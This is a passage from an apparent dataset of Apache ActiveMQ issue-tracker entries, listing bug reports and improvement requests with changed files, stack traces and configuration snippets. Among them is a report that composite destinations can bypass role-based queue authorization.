... 17 more&#91;1&#93; http://activemq.apache.org/initial-configuration.html
issueID:AMQ-3716
type:Bug
changed files:
texts:NetworkBridge with conduitSubscriptions=true will leak consumer info in org.apache.activemq.network.DemandForwardingBridgeSupport#subscriptionMapByRemoteId map
There is a leak in the tracking of consumer info commands in the conduit network bridge. Entries are not removed on a remove advisory.
issueID:AMQ-3718
type:Improvement
changed files:BrokerService.java
SelectorManager.java
TaskRunnerFactory.java
texts:Thread pool turnover is to heavy due to Executor configuration
The following files use Executors that are poorly configured for every day use.src/main/java/org/apache/activemq/broker/BrokerService.javasrc/main/java/org/apache/activemq/thread/TaskRunnerFactory.javasrc/main/java/org/apache/activemq/transport/nio/SelectorManager.javaAdded suggested patch, but the timings should really be configurable to provide better control.The NIO SelectorManager change has shaved time savings of at least 1/6 - 1/4 off some of our long running tests.
issueID:AMQ-3719
type:Bug
changed files:
texts:Tracked command IOException causes FailoverTransport to hang until failure occurs for untracked command
I have only encountered this failure when the broker is experiencing heavy load and a new connection attempt is made. The FailoverTransport tracks commands that have been issued so that it can restore the state upon a failure/reconnect event. If an IOException occurs when sending a tracked command, the oneway() method returns, assuming that the IOException is indicative of a transport failure and will result in a failure/reconnect event. Some IOExceptions (like WireFormatNegotiation timesouts) are not always indicative of transport failure however.  In this case since no subsequent failure/reconnect event occurs, the command will never be resent.  If this is a synchronous command (like that generated by starting a connection) the calling thread will hang.Incidentally, my reading of the code is that only non-tracked commands can generate the IOException that triggers the handleTransportFailure command.  Is that what we really want?  My belief is that the IOExceptions should always result in the triggering of the handleTransportFailure, regardless of origin.I will attach a unit test and fix shortly.  The test will often fail (i.e. hang) without the fix, but not always since I use a wireFormat.maxInactivityDurationInitalDelay=1 option to trigger the behavior.  If the system runs fast enough, it sometimes will not get the timeout.  I wasn"t sure exactly how such a test should be written...The test will fail if connection does not succeed within 60s
issueID:AMQ-3721
type:Improvement
changed files:StompNIOTransport.java
texts:StompNIOTransport doStop should check for null before calling selection.stop()
The StompNIOTransport calls selection.stop() in doStop and prints an exception stack trace to the console, the selection object is initialized in initializeStreams which may not be called if an error occurs as the connection is being establised.  We should add a null check and not output stack trace data to the console.
issueID:AMQ-3722
type:Bug
changed files:AmqBrowseCommand.java
texts:"activemq-admin browse" help command prints incorrect argument name for password in sample usage
Small cosmetic errorThe help message printed from activemq-admin browseMain browse --amqurl tcp://localhost:61616 --user someUser --pass somePass FOO.BAR        - Print the message header, custom message header, and message body of all messages in the          queue FOO.BAR, using someUser as the user name, and somePass as the passwordthe "-pass" argument above is not recognized, it should be "-password"
issueID:AMQ-3723
type:Improvement
changed files:
texts:Namespace handler not compatible with Spring 3.1 bean profiles
I try to configure an ActiveMQ broker and a connection factory using "amq:" prefixed tags ("http://activemq.apache.org/schema/core" namespace) placed in the Spring application context definition. Namespaced tags placed inside a bean profile (profiles are a new feature for Spring 3.1) are silently ignored. The same tags placed outside a profile are parsed correctly.It"s not a bug in Spring Framework - see Chris Beams" comment to SPR-9119 issue.There is a test project attached to SPR-9119 and - as Chris Beams writes - a test project on the SpringSource GitHub: https://github.com/SpringSource/spring-framework-issues/tree/master/SPR-9119.
issueID:AMQ-3725
type:Bug
changed files:CallerBufferingDataFileAppender.java
DataFile.java
DataFileAccessor.java
RecoverableRandomAccessFile.java
DataFileAppender.java
PageFile.java
texts:Kahadb error during SAN failover delayed write - Allow kahaDB to recover in a similar manner as the JDBC store using the IOExceptionHandler
An issue can arise that causes the broker to terminate when using kahaDB with a SAN, when the SAN fails over.  In this case the failover process is seamless however, on fail back there is a 2-3 sec delay where writes are blocked and the broker terminates.  With the JDBC datastore a similar situation can be handled by using the IOExceptionHandler.  However with kahaDB, when this same IOExceptionHandler is added it prevents the broker from terminating but kahaDB retains an invalid index. INFO | ActiveMQ JMS Message Broker (Broker1, ID:macbookpro-251a.home-56915-1328715089252-0:1) started INFO | jetty-7.1.6.v20100715 INFO | ActiveMQ WebConsole initialized. INFO | Initializing Spring FrameworkServlet "dispatcher" INFO | ActiveMQ Console at http://0.0.0.0:8161/admin INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo INFO | RESTful file access application at http://0.0.0.0:8161/fileserver INFO | FUSE Web Console at http://0.0.0.0:8161/console INFO | Started SelectChannelConnector@0.0.0.0:8161ERROR | KahaDB failed to store to Journaljava.io.SyncFailedException: sync failed at java.io.FileDescriptor.sync(Native Method) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203) INFO | Ignoring IO exception, java.io.SyncFailedException: sync failedjava.io.SyncFailedException: sync failed at java.io.FileDescriptor.sync(Native Method) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)ERROR | Checkpoint failedjava.io.SyncFailedException: sync failed at java.io.FileDescriptor.sync(Native Method) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203) INFO | Ignoring IO exception, java.io.SyncFailedException: sync failedjava.io.SyncFailedException: sync failed at java.io.FileDescriptor.sync(Native Method) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:382) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)ERROR | KahaDB failed to store to Journaljava.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203) INFO | Ignoring IO exception, java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203)ERROR | KahaDB failed to store to Journaljava.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203) INFO | Ignoring IO exception, java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory)java.io.FileNotFoundException: /Volumes/NAS-01/data/kahadb/db-1.log (No such file or directory) at java.io.RandomAccessFile.open(Native Method) at java.io.RandomAccessFile.<init>(RandomAccessFile.java:216) at org.apache.kahadb.journal.DataFile.openRandomAccessFile(DataFile.java:70) at org.apache.kahadb.journal.DataFileAppender.processQueue(DataFileAppender.java:324) at org.apache.kahadb.journal.DataFileAppender$2.run(DataFileAppender.java:203) WARN | Transport failed: java.io.EOFException WARN | Transport failed: java.io.EOFException INFO | KahaDB: Recovering checkpoint thread after deathERROR | Checkpoint failedjava.io.IOException: Input/output error at java.io.RandomAccessFile.write(Native Method) at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001) at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006) at org.apache.kahadb.page.PageFile.flush(PageFile.java:484) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290) at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768) at org.apache.kahadb.page.Transaction.execute(Transaction.java:760) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315) INFO | Ignoring IO exception, java.io.IOException: Input/output errorjava.io.IOException: Input/output error at java.io.RandomAccessFile.write(Native Method) at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001) at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006) at org.apache.kahadb.page.PageFile.flush(PageFile.java:484) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290) at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768) at org.apache.kahadb.page.Transaction.execute(Transaction.java:760) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315) INFO | KahaDB: Recovering checkpoint thread after deathERROR | Checkpoint failedjava.io.IOException: Input/output error at java.io.RandomAccessFile.write(Native Method) at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001) at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006) at org.apache.kahadb.page.PageFile.flush(PageFile.java:484) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290) at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768) at org.apache.kahadb.page.Transaction.execute(Transaction.java:760) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315) INFO | Ignoring IO exception, java.io.IOException: Input/output errorjava.io.IOException: Input/output error at java.io.RandomAccessFile.write(Native Method) at java.io.RandomAccessFile.writeLong(RandomAccessFile.java:1001) at org.apache.kahadb.page.PageFile.writeBatch(PageFile.java:1006) at org.apache.kahadb.page.PageFile.flush(PageFile.java:484) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1290) at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:768) at org.apache.kahadb.page.Transaction.execute(Transaction.java:760) at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:766) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:315) WARN | Transport failed: java.io.EOFException
issueID:AMQ-3727
type:Bug
changed files:
texts:activemq-web-console: AjaxServlet not working in OSGi container
Installing activemq-web-console as a bundle in a ServiceMix container osgi:install mvn:org/apache/activemq/activemq-web-consoleregisters the AjaxServlet under http://<baseurl>/activemqweb/ajax but trying to access it fails with a ClassNotFoundError:java.lang.NoClassDefFoundError: org/eclipse/jetty/continuation/ContinuationSupport at org.apache.activemq.web.MessageListenerServlet.doMessages(MessageListenerServlet.java:304)&#91;163:org.apache.activemq.activemq-web-console:5.5.1&#93; at org.apache.activemq.web.MessageListenerServlet.doGet(MessageListenerServlet.java:241)&#91;163:org.apache.activemq.activemq-web-console:5.5.1&#93; at org.apache.activemq.web.AjaxServlet.doGet(AjaxServlet.java:47)&#91;163:org.apache.activemq.activemq-web-console:5.5.1&#93; at javax.servlet.http.HttpServlet.service(HttpServlet.java:693) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:538)&#91;97:org.eclipse.jetty.servlet:7.4.5.v20110725&#93; at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1352)&#91;97:org.eclipse.jetty.servlet:7.4.5.v20110725&#93; at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)&#91;163:org.apache.activemq.activemq-web-console:5.5.1&#93; at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1323)&#91;97:org.eclipse.jetty.servlet:7.4.5.v20110725&#93; at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:476)&#91;97:org.eclipse.jetty.servlet:7.4.5.v20110725&#93; at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70)&#91;111:org.ops4j.pax.web.pax-web-jetty:1.0.7&#93; at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:480)&#91;99:org.eclipse.jetty.security:7.4.5.v20110725&#93; at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:937)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:116)&#91;111:org.ops4j.pax.web.pax-web-jetty:1.0.7&#93; at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:406)&#91;97:org.eclipse.jetty.servlet:7.4.5.v20110725&#93; at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:871)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:72)&#91;111:org.ops4j.pax.web.pax-web-jetty:1.0.7&#93; at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:110)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.Server.handle(Server.java:342)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:589)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1048)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:601)&#91;100:org.eclipse.jetty.http:7.4.5.v20110725&#93; at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:214)&#91;100:org.eclipse.jetty.http:7.4.5.v20110725&#93; at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:411)&#91;96:org.eclipse.jetty.server:7.4.5.v20110725&#93; at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:535)&#91;98:org.eclipse.jetty.io:7.4.5.v20110725&#93; at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:40)&#91;98:org.eclipse.jetty.io:7.4.5.v20110725&#93; at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:529)&#91;108:org.eclipse.jetty.util:7.4.5.v20110725&#93; at java.lang.Thread.run(Thread.java:662)&#91;:1.6.0_23&#93;Caused by: java.lang.ClassNotFoundException: org.eclipse.jetty.continuation.ContinuationSupport not found by org.apache.activemq.activemq-web-console &#91;163&#93; at org.apache.felix.framework.ModuleImpl.findClassOrResourceByDelegation(ModuleImpl.java:787)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.felix.framework.ModuleImpl.access$400(ModuleImpl.java:71)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at org.apache.felix.framework.ModuleImpl$ModuleClassLoader.loadClass(ModuleImpl.java:1768)&#91;org.apache.felix.framework-3.0.9.jar:&#93; at java.lang.ClassLoader.loadClass(ClassLoader.java:248)[:1.6.0_23Adding "org.eclipse.jetty.continuation;resolution:=optional" to the Import-Package: statement in MANIFEST.MF/Import-Package element in pom.xml of activemq-web-console fixes it.
issueID:AMQ-3729
type:Bug
changed files:
texts:Stomp wireformat and codec block on telnet CRLF CRLF header separator
changes 1.1 support and nio have broken telnet support for stomp. The telnet CRLF in place of LF is the root cause.
issueID:AMQ-3731
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Suspicious NPE in log when network bridge cannot be established and loggingBrokerPlugin configured
WIth the following broker plugins enabled: <plugins><loggingBrokerPlugin logAll="true" logConnectionEvents="false"/><traceBrokerPathPlugin/></plugins>and network bridge down (only one broker up), the following error appears in the active broker log:WARN  - DiscoveryNetworkConnector      - Could not start network bridge between: vm://broker1?async=false&network=true and: tcp://0.0.0.0:61627?soWriteTimeout=15000&soTimeout=15000&wireFormat.maxInactivityDuration=30000 due to: java.net.ConnectException: Connection refusedWARN  - DemandForwardingBridgeSupport  - Caught an exception processing local commandjava.lang.NullPointerException at org.apache.activemq.broker.util.LoggingBrokerPlugin.removeBroker(LoggingBrokerPlugin.java:406) at org.apache.activemq.broker.MutableBrokerFilter.removeBroker(MutableBrokerFilter.java:195) at org.apache.activemq.broker.MutableBrokerFilter.removeBroker(MutableBrokerFilter.java:195) at org.apache.activemq.network.DemandForwardingBridgeSupport.stop(DemandForwardingBridgeSupport.java:339) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:718) at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:130) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:159) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:991) at org.apache.activemq.broker.TransportConnection$4.run(TransportConnection.java:954) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)While this doesn"t cause anything to break its not helpful to see these logs.  The issue is that the DemandForwardingBridgeSupport stop method always calls removeBroker on the remote even if it never connected and the remote broker info is null.  We should check this condition first before trying to remove something we never connected to.
issueID:AMQ-3732
type:Bug
changed files:
texts:Different methods synchronizing on different mutexes when changing the same field
org.apache.activemq.broker.region.PrefetchSubscription.prefetchExtension is changed while guarded by a mutex on this (PrefetchSubscription) in PrefetchSubscription.pullMessage(...) and PrefetchSubscription.dispatchLock in PrefetchSubscription.acknowledge(...). This can lead to the corruption of the prefetchExtension variable (eg, prefetchExtension++ in pullMessage() is not an atomic operation so prefetchExtension may change in acknowledge() mid-way through this operation).
issueID:AMQ-3733
type:Bug
changed files:
texts:Topic subscriber is  assumed to be slow consumer when prefetch is set to one.
The broker checks for slow subscribers by checking its dispatch queue size against the prefetch size. If the dispatch queue is greater than or equal to the prefetch size the broker treats this subscription is a slow subscriber. However if the subscribers prefetch size is "1" then the subscription will get treated as a slow subscriber even if the messages do not remain long in the subscription. This can result in a lot of warning log statements "TopicSubscription: consumer=... has reached its prefetch limit without an ack, it appears to be slow"and slow consumer advisory messages being generated if "AdvisoryForSlowConsumers" has been turned on.
issueID:AMQ-3734
type:Improvement
changed files:
texts:Add username info in ConnectionViewMBean and SubscriptionViewMBean
The intention of this enhancement is for monitoring purposes.It would be nice to be able to view from JMX which user is using a given connection.  This could be for example a new read-only attribute "UserName" on MBean org.apache.activemq.broker.jmx.ConnectionViewMBean.The Same idea applies to org.apache.activemq.broker.jmx.SubscriptionViewMBean and org.apache.activemq.broker.jmx.ProducerViewMBean.  This property should be controlled however by configuration on the BrokerService to enable or disable this user name tracking, the default value should be to disable this.  When disabled the reported user name from these beans would be null.
issueID:AMQ-3737
type:Bug
changed files:
texts:Possible leak in ManangedRegionBroker unregisterDestination
Method unregisterDestination in ManagedRegionBroker is supposed to remove the SlowConsumerStrategy MBean on the destination it removes if one exists but the code is incorrect and will never actually do so.    protected void unregisterDestination(ObjectName key) throws Exception {        DestinationView view = null;        removeAndRemember(topics, key, view);        removeAndRemember(queues, key, view);        removeAndRemember(temporaryQueues, key, view);        removeAndRemember(temporaryTopics, key, view);        if (registeredMBeans.remove(key)) {            try {                managementContext.unregisterMBean(key);            } catch (Throwable e) {                LOG.warn("Failed to unregister MBean: " + key);                LOG.debug("Failure reason: " + e, e);            }        }        if (view != null) {            key = view.getSlowConsumerStrategy();            if (key!= null && registeredMBeans.remove(key)) {                try {                    managementContext.unregisterMBean(key);                } catch (Throwable e) {                    LOG.warn("Failed to unregister slow consumer strategy MBean: " + key);                    LOG.debug("Failure reason: " + e, e);                }            }        }    }Attempts to pass the DestinationView into removeAndRemember() as an "out" parameter so it never ends up getting set to anything and the last if will never be executed because view will always be null.
issueID:AMQ-3740
type:Improvement
changed files:
texts:upgrade aries.transaction.manager bundle version to 0.3
None
issueID:AMQ-3742
type:Bug
changed files:
texts:STOMP subscriber does not receive TextMessage with null body sent from JMS
If a JMS publisher sends a TextMessage with null body, any STOMP subscribers to the topic (I haven"t tested queues) will not receive that message or any further messages on that topic.
issueID:AMQ-3743
type:Bug
changed files:
texts:activemq-web-console WAR with SNAPSHOT dependencies breaks osgi Bundle-ClassPath in manifest
The maven-war-plugin will install snapshot version dependencies using their timestamp qualified name but the maven-bundle-plugin used to generate the Bundle-ClassPath strips off the timestamp qualifier.The fix is to make use of the archive file name mapping to strip off the qualifier in for the embedded dependencies.This is only a problem during development as we never release with SNAPSHOT dependencies.
issueID:AMQ-3746
type:Bug
changed files:
texts:Non Durable Topic subscription with prefetch=0, MessageConsumer.receivenowait() (or MessageConsumer.receive(timeout) hangs indefinitely
Non Durable Topic subscription with prefetch=0, MessageConsumer.receivenowait() (or MessageConsumer.receive(timeout) hangs indefinitely.I get the following thread dump"main" prio=5 tid=7f996d000000 nid=0x105bc3000 in Object.wait() [105bc1000]   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) - waiting on <7f39f1b30> (a java.lang.Object) at java.lang.Object.wait(Object.java:485) at org.apache.activemq.SimplePriorityMessageDispatchChannel.dequeue(SimplePriorityMessageDispatchChannel.java:87) - locked <7f39f1b30> (a java.lang.Object) at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:468) at org.apache.activemq.ActiveMQMessageConsumer.receiveNoWait(ActiveMQMessageConsumer.java:621) at org.apache.activemq.usecases.TopicSubscriptionZeroPrefetchTest.testTopicConsumerPrefetchZero(TopicSubscriptionZeroPrefetchTest.java:71)It seems the TopicSubscription does not support "pullMessage".This only appears to impact Non Durable Topic Subscriptions. Durable Topic Subscriptions with prefetch=0 do NOT exhibit this behavior.
issueID:AMQ-3747
type:Improvement
changed files:XBeanBrokerFactory.java
texts:Syntax errors are not showing up in the log when the broker is started in the background
Issue:When there is a simple syntax error in the configuration file, e.g.:<policyEntry queue="MY.INPUTQ" producerFlowControl="true" memoryLimit="50mb">           <pendingQueuePolicy>                 <vmQueueCursor/>           </pendingQueuePolicy></policyEntry>           <pendingQueuePolicy>     <=== This is incorrect as it isn"t associated with policy entry                  <vmQueueCursor/>           </pendingQueuePolicy>                </policyEntry>When I start the broker in the foreground, broker console, I see loads of SAX parser errors. None of these are in the log. If I start the broker in the background, broker start, nothing shows up in the log. Can we fix this up so syntax errors go to the log?Problem:The background start script redirects to dev/null so console output is lost intentionally. Otherwise the default console logging would fill up system logs.However there is no other indication of a parse error of the xml configuration apart from the exception printed to the console.Solution:The error should also go to the default log so it needs to be trapped at source and logged there before being propagated back to the command line caller.
issueID:AMQ-3748
type:Bug
changed files:ActiveMQEndpointWorker.java
texts:ActiveMQEndpointWorker$1: Run method is synchronized
As posted in this mail &#91;0&#93; by Ed Keen there is a issue in the ActiveMQEndpointWorker.I checked the spec the JBoss guys mentioned and in section 10.3.2 it is clearly stated:"Both the run and release methods in the Work implementation may containsynchronization blocks but they must not be declared as synchronized methods."Removing the "synchronized" worked for some people trying this. But I think it was added intentionally, so somebody should check an appropriate alternative.This bug prevents ActiveMQ from being deployed on JBoss AS 7.1&#91;0&#93;: http://mail-archives.apache.org/mod_mbox/activemq-users/201202.mbox/%3CCAC=rkz2XZmJo3D03kHG6nfz0c800-Mh=9JH6qb=zeGQyU=MNXQ@mail.gmail.com%3E&#91;1&#93;: http://download.oracle.com/otn-pub/jcp/connector_architecture-1.6-fr-oth-JSpec/connector-1_6-final-spec.pdf
issueID:AMQ-3749
type:Bug
changed files:
texts:Composite destinations break simple authorisation through role aggregation
Given authorisation where there is overlap in roles, using a composite destination can gain access in error. eg:  <authorizationMap>    <authorizationEntries>      <authorizationEntry queue=">" read="admins" write="admins" admin="admins" />      <authorizationEntry queue="USER.>" read="users" write="users" admin="users" />      ... The correct expectation is that a "user" can only access queues that match "USER.>" but a user can bypass this and access a private queue using a composite destination q(PRIVATE,USER.A) because the permissions are aggregated in error and we look for a single match.
issueID:AMQ-3750
type:Improvement
changed files:PolicyEntry.java
MessageStore.java
DestinationFilter.java
ProxyTopicMessageStore.java
Topic.java
AbstractMessageStore.java
Queue.java
BaseDestination.java
ProxyMessageStore.java
Destination.java
texts:Add a hint when storing a message so a message store can optimise message storage if the message is likely to be consumed quickly
LevelDB persistent store requires a hint to do concurrent store and dispatch
issueID:AMQ-3752
type:Bug
changed files:
texts:Repeated call to PooledConnection.setClientID() with the same clientId should not raise a IllegalStateException("Setting clientID on a used Connection is not allowed")
Calling ActiveMQConnection.setClientID() twice currently raises an IllegalStateException:ActiveMQConnection.javapublic void setClientID(String newClientID) throws JMSException {        checkClosedOrFailed();        if (this.isConnectionInfoSentToBroker) {            throw new IllegalStateException("Setting clientID on a used Connection is not allowed");        }                this.info.setClientId(newClientID);        this.userSpecifiedClientID = true;        ensureConnectionInfoSent();    }This successfully prevents from overriding clientID on an already started connection.However in the case of using a Camel JMS endpoint with durable subscriptions, transactions and configuring for a PooledConnectionFactory, this current behavior causes problems. Due to the durable sub a clientID needs to be set on the connection. This happens at startup of the JMS consumer by calling ActiveMQConnection.setClientID().If you stop the Camel route, the connection will be released back to the pool with the clientID remaining. If you restart the Camel route, it will setup a new Spring DMLC and reinitialize the connection with the configured clientId. A new connection is obtained from the pool and setClientID() is invoked on that connection. This will raise the above Exception. If we try to set the same clientID on the PooledConnection again, we should simply ignore the call rather than raising an exception.This allows the camel-jms consumer to be restarted. Without a fix, its impossible restart a Camel route that uses camel-jms with durable subscriptions and the PooledConnectionFactory.
issueID:AMQ-3753
type:Bug
changed files:JmDNS.java
texts:Exception on stopping the broker - Timer already cancelled
I get this exception when i try to kill the broker.Failed to shut down: java.lang.IllegalStateException: Timer already cancelled.And the broker is killed, but why the exception ?
issueID:AMQ-3754
type:Bug
changed files:
texts:intermittent failure of org.apache.activemq.transport.vm.VmTransportNetworkBrokerTest
The JUnit test org.apache.activemq.transport.vm.VmTransportNetworkBrokerTest fails most of the time on a Mac OSX machine. The reason for the failure is that the test assumes the JVM itself will not create any additional threads at runtime. This however is a false assumption as on Mac OSX a daemon thread called "Poller SunPKCS11-Darwin" is created at some later point in time (after the test got kicked off already) under the main thread group. This extra but JVM internal thread makes the test fail on Mac OSX right now.
issueID:AMQ-3756
type:Bug
changed files:
texts:Source archive misses or mangles the test stores - result in failed tests
there is a problem with the stores in the source archive that effects:org.apache.activemq.store.amq.reader.AMQReaderTestorg.apache.activemq.store.kahadb.KahaDBVersionTest
issueID:AMQ-3757
type:Improvement
changed files:TransportConnector.java
PublishedAddressPolicy.java
texts:Dynamic Failover Sends Clients Resolved Host Names
Hello,When using dynamic failover the broker appears to resolve its transport connectors IP address to an available host which is then returned client and not the IP address.  There are cases where it is desirable to have the IP address sent to the clients and not a resolved host.Having the broker return the exact address as it is shown in the transport configuration to dynamically configure clients is desirable.Thanks,Scott EShttp://fusesource.com
issueID:AMQ-3758
type:New Feature
changed files:
texts:Recover scheduler database option
I am not sure why, but Scheduler database got corrupted, and some messages couldn"t be delivered to a broker. I got many exceptions similar to:2012-03-02 03:26:08,234 | ERROR | JMS Failed to schedule job | org.apache.activemq.broker.scheduler.JobSchedulerImpl | JobScheduler:JMS java.io.IOException: Could not locate data file <correct-file-path>db-2.log         at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350)         at org.apache.kahadb.journal.Journal.read(Journal.java:597)         at org.apache.activemq.broker.scheduler.JobSchedulerStore.getPayload(JobSchedulerStore.java:315)         at org.apache.activemq.broker.scheduler.JobSchedulerImpl.fireJob(JobSchedulerImpl.java:421)         at org.apache.activemq.broker.scheduler.JobSchedulerImpl.mainLoop(JobSchedulerImpl.java:473)         at org.apache.activemq.broker.scheduler.JobSchedulerImpl.run(JobSchedulerImpl.java:429)         at java.lang.Thread.run(Unknown Source) The problem is that there is no way to restore the database like you can if you are working with the main ActiveMQ database. You can fix the main database by specifying the following configuration:<persistenceAdapter>              <kahaDB directory="${activemq.base}/data/kahadb"                     ignoreMissingJournalfiles="true"                     checkForCorruptJournalFiles="true"                     checksumJournalFiles="true" />  </persistenceAdapter>It would be nice to have the same feature for the scheduler database.
issueID:AMQ-3768
type:Bug
changed files:
texts:ClassCastException when running some Durable Consumer test cases
